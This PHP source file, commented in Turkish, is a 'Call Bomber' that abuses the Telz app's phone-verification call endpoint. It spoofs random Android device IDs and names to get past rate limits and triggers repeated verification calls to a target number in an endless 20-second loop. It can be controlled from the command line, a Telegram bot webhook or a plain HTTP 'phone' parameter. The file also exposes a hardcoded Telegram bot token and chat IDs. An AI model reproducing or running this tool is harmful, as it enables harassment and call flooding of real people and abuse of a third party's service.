<?php
/**
 * Ritalin Tool Call Bomber - PHP Bot + Telegram Webhook
 * Telz API üzerinden arama gönderir.
 * Telegram bot komutu ile veya webhook ile aktif edilir.
 */

// ==================== KONFIGÜRASYON ====================
define('MODE', 'TEST_RANDOM_IDS'); // TEST_RANDOM_IDS veya DEBOUNCE
define('GOKU', 300);
define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('LOOP_INTERVAL', 20);
define('MAX_RUNS', 0);

// ==================== TELEGRAM BOT KONFIG ====================
// ==================== TELEGRAM BOT KONFIG ====================
define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
define('ADMIN_CHAT_ID', '7650776904'); // Admin kullanıcı ID
define('GROUP_CHAT_ID', '-1003963392550'); // Grup ID (isteğe bağlı)

// ==================== FONKSİYONLAR ====================

function randomAndroidId() {
    return bin2hex(random_bytes(8));
}

function randomDeviceName() {
    $brands = ['Pixel', 'Xiaomi', 'Samsung', 'OnePlus', 'Moto'];
    return $brands[array_rand($brands)] . '-' . substr(bin2hex(random_bytes(3)), 0, 6);
}

function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
    if (MODE === 'TEST_RANDOM_IDS' && $androidId === null) {
        $androidId = randomAndroidId();
    }
    if ($uuid === null) $uuid = generateUUID();
    
    $payload['android_id'] = $androidId ?? '13e50e93a6399e67';
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($httpCode === 429) {
        throw new Exception("Fazla deneme! Retry-After kontrol edin.");
    }
    if ($httpCode >= 400) {
        throw new Exception("HTTP Hata: $httpCode - $response");
    }
    if ($error) {
        throw new Exception("CURL Hatası: $error");
    }
    
    return json_decode($response, true) ?? $response;
}

function sendCall($phone) {
    try {
        $androidId = randomAndroidId();
        $uuid = generateUUID();
        $deviceName = (MODE === 'TEST_RANDOM_IDS') ? randomDeviceName() : 'Xiaomi 2311DRK48G';
        
        telzRequest('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
        telzRequest('app/run', [
            'event' => 'run',
            'device_name' => $deviceName,
            'ipv4_address' => '10.1.10.1',
            'ipv6_address' => 'FE80::1',
            'lang' => 'tr',
            'network_country' => 'tr',
            'network_type' => '4G',
            'roaming' => 'no',
            'root' => 'no',
            'run_id' => '',
            'sim_country' => 'tr'
        ], $androidId, $uuid);
        
        telzRequest('app/stat_btns', [
            'event' => 'stat_btns',
            'btn' => 'on_reg_continue'
        ], $androidId, $uuid);
        
        telzRequest('app/validate_phonenumber', [
            'event' => 'validate_phonenumber',
            'phone' => $phone,
            'region' => 'TR'
        ], $androidId, $uuid);
        
        $result = telzRequest('app/auth_call', [
            'event' => 'auth_call',
            'phone' => $phone,
            'attempt' => '0',
            'lang' => 'tr'
        ], $androidId, $uuid);
        
        if (isset($result['status']) && $result['status'] === 'ok') {
            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone"];
        } else {
            return ['success' => false, 'message' => "❌ Hata: " . ($result['reason'] ?? 'Bilinmeyen')];
        }
    } catch (Exception $e) {
        return ['success' => false, 'message' => "❌ Hata: " . $e->getMessage()];
    }
}

// ==================== TELEGRAM BOT MESAJ GÖNDER ====================
function sendTelegramMessage($chatId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ==================== WEBHOOK (Telegram Bot) ====================
if (php_sapi_name() !== 'cli') {
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    // Webhook set etme (ilk kurulum)
    if (isset($_GET['setwebhook'])) {
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
        $result = file_get_contents($url);
        echo $result;
        exit;
    }
    
    // Bot komutlarını işle
    if ($update && isset($update['message'])) {
        $chatId = $update['message']['chat']['id'];
        $text = $update['message']['text'] ?? '';
        $fromId = $update['message']['from']['id'] ?? '';
        
        // Sadece admin kullanabilir
        if (ADMIN_CHAT_ID && $chatId != ADMIN_CHAT_ID) {
            sendTelegramMessage($chatId, "⛔ Bu botu kullanma yetkiniz yok.");
            exit;
        }
        
        // /start komutu
        if ($text === '/start') {
            sendTelegramMessage($chatId, "📞 <b>Call Bomber</b>\n\n"
                . "Komutlar:\n"
                . "/call +90547374737 - Arama gönder\n"
                . "/stop - Durdur\n"
                . "/status - Bot durumu");
            exit;
        }
        
        // /call +90
        if (strpos($text, '/call ') === 0) {
            $phone = trim(substr($text, 6));
            if (empty($phone)) {
                sendTelegramMessage($chatId, "❌ Lütfen numara girin: /call +90");
                exit;
            }
            
            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
            $result = sendCall($phone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        // /stop
        if ($text === '/stop') {
            sendTelegramMessage($chatId, "⏹️ Bot durduruldu. (Bu özellik webhook ile durdurma için örnek)");
            exit;
        }
        
        // /status
        if ($text === '/status') {
            sendTelegramMessage($chatId, "✅ Bot aktif\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s");
            exit;
        }
        
        // Tanımsız komut
        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start yazın.");
    }
    
    // Normal HTTP isteği (GET/POST ile phone)
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if ($phone) {
        $result = sendCall($phone);
        header('Content-Type: application/json');
        echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
    
    // Boş istek
    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber Aktif']);
    exit;
}

// ==================== CLI BOT MODU ====================
if (php_sapi_name() === 'cli') {
    echo "\n========================================\n";
    echo "  📞 CALL BOMBER\n";
    echo "========================================\n";
    echo "  MODE: " . MODE . "\n";
    echo "  LOOP_INTERVAL: " . LOOP_INTERVAL . " saniye\n";
    echo "  MAX_RUNS: " . (MAX_RUNS === 0 ? 'Sonsuz' : MAX_RUNS) . "\n";
    echo "========================================\n\n";
    
    $phone = readline("Numara gir (+90xx): ");
    $phone = trim($phone);
    
    if (empty($phone)) {
        echo "❌ Numara girilmedi.\n";
        exit(1);
    }
    
    echo "\n🚀 Bot başlatılıyor... (Ctrl+C ile durdur)\n\n";
    
    $runCount = 0;
    while (MAX_RUNS === 0 || $runCount < MAX_RUNS) {
        $runCount++;
        echo "\n--- Döngü #$runCount ---\n";
        
        $result = sendCall($phone);
        echo $result['message'] . "\n";
        
        if (MAX_RUNS === 0 || $runCount < MAX_RUNS) {
            echo "⏳ " . LOOP_INTERVAL . " saniye bekleniyor...\n";
            sleep(LOOP_INTERVAL);
        }
    }
    
    echo "\n✅ Bot tamamlandı. $runCount döngü çalıştı.\n";
}